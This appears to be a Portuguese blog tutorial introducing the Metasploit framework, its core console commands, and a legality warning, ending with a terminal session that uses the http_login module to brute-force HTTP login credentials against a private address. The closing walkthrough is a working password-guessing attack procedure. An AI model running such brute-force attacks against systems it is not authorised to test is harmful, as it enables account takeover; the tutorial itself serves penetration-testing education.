---
date: '2022-12-21T19:18:16.260Z'
title: Utilizando Metasploit, resumo básico do funcionamento 
tagline: Metasploit.
preview: >-
  O Metasploit é um software de exploração de vulnerabilidades de
  código aberto que pode ser usado para realizar testes de penetração e
  desenvolver exploits. Ele foi criado por HD Moore em 2003 e é mantido pela
  empresa de segurança cibernética Rapid7
image: >-
    https://cdn.pixabay.com/photo/2017/08/10/08/47/laptop-2620118_960_720.jpg
---

O **Metasploit** é um software de exploração de vulnerabilidades de código aberto que pode ser usado para realizar testes de penetração e desenvolver **exploits**. Ele foi criado por HD Moore em 2003 e é mantido pela empresa de segurança cibernética Rapid7. O Metasploit possui uma ampla biblioteca de exploits que podem ser usados para comprometer sistemas vulneráveis, bem como ferramentas de auxílio à exploração e post-exploração. Além disso, o Metasploit também inclui recursos para criar payloads personalizados e para fazer o gerenciamento de sessões de exploit. Ele é amplamente utilizado por profissionais de segurança cibernética para testar a segurança de sistemas e aplicativos.

Para utilizar o Metasploit, primeiro é necessário instalá-lo em seu sistema. Isso pode ser feito baixando o código fonte do Metasploit a partir do GitHub e compilando-o manualmente, ou instalando uma versão pré-compilada disponível em alguns repositórios de pacotes de software. Depois de instalado, o Metasploit pode ser iniciado a partir da linha de comando.

Uma vez iniciado o Metasploit, você pode começar a usá-lo digitando comandos na linha de comando. Por exemplo, para selecionar um exploit específico para ser usado, você pode usar o comando `use` seguido pelo nome do exploit. Em seguida, você pode ver as opções disponíveis para o exploit selecionado usando o comando `show options`, e definir valores para essas opções usando o comando `set`. Quando estiver pronto, você pode executar o exploit selecionado contra o alvo especificado usando o comando `exploit`.

O **Metasploit** também inclui várias ferramentas de auxílio à exploração e de post-exploração que podem ser usadas para obter informações adicionais sobre o sistema alvo e para realizar ações adicionais após a exploração bem-sucedida. Para selecionar e usar essas ferramentas, o processo é semelhante ao descrito acima para exploits.

É importante lembrar que o uso do Metasploit deve ser feito com cuidado e somente em sistemas e aplicativos que seja permitido testar. O uso indevido do Metasploit pode causar danos a sistemas alvo e é considerado ilegal em muitas jurisdições. Portanto, é importante conhecer e seguir as leis e regulamentos locais ao usar o Metasploit.

Existem muitos comandos diferentes disponíveis no Metasploit, e aqui estão alguns dos comandos mais comuns:

`use`: Seleciona um módulo de exploit ou de auxílio à exploração específico para ser usado.

`show options`: Exibe as opções e parâmetros disponíveis para o módulo selecionado atualmente.

`set`: Define um valor para uma opção específica do módulo selecionado atualmente.

`exploit`: Executa o exploit selecionado atualmente contra o alvo especificado.

`sessions`: Gerencia sessões de exploit ativas, incluindo a visualização e interação com elas.

`search`: Pesquisa na biblioteca de exploits por palavras-chave específicas.

`load`: Carrega um plug-in personalizado no Metasploit.

`help`: Exibe ajuda sobre um comando específico ou uma lista de todos os comandos disponíveis.

Esses são apenas alguns exemplos de comandos do Metasploit. Para obter uma lista completa e detalhada dos comandos disponíveis, é recomendável consultar a documentação do Metasploit ou usar o comando `help` no próprio software.

Aqui está um exemplo de comando do Metasploit que pode ser usado para realizar um ataque de dicionário simples em um sistema alvo:

```terminal
msf5 > use auxiliary/scanner/http/http_login
msf5 auxiliary(scanner/http/http_login) > show options

Module options (auxiliary/scanner/http/http_login):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BLANK_PASSWORDS   true       yes       Try blank passwords for all users
   BRUTEFORCE_SPEED  5          yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false      no        Try each user/password couple stored in the current database
   DB_ALL_PASS      false      no        Add all passwords in the current database to the list
   DB_ALL_USERS     false      no        Add all users in the current database to the list
   PASSWORD                  no        A specific password to authenticate with
   PASS_FILE                 no        File containing passwords, one per line
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   Realm                     no        The realm to probe
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                     80        The target port
   STOP_ON_SUCCESS   false      yes       Stop guessing when a credential works for a host
   TARGETURI                /         The base path to the web application
   USERNAME                  no        A specific username to authenticate with
   USERPASS_FILE                   no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false      no        Try the username as the password for all users
   USER_FILE                  no        File containing usernames, one per line
   USER_AS_PASS_FILE  false      no        Try the username as the password for each user specified in USER_FILE

msf5 auxiliary(scanner/http/http_login) > set USER_FILE /root/usernames.txt
USER_FILE => /root/usernames.txt
msf5 auxiliary(scanner/http/http_login) > set PASS_FILE /root/passwords.txt
PASS_FILE => /root/passwords.txt
msf5 auxiliary(scanner/http/http_login) > set RHOSTS 192.168.1.1
RHOSTS => 192.168.1.1
msf5 auxiliary(scanner/http/http_login) > exploit

[*] 192.168.1.1:80 - Starting HTTP login brute force
[*] 192.168.1.1:80 - The target is using BASIC authentication
[*] 192.168.1.1:80 - Trying username "admin" with password "password"
[+] 192.168.1.1:80 - Login successful: "admin:password"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/http_login) >

```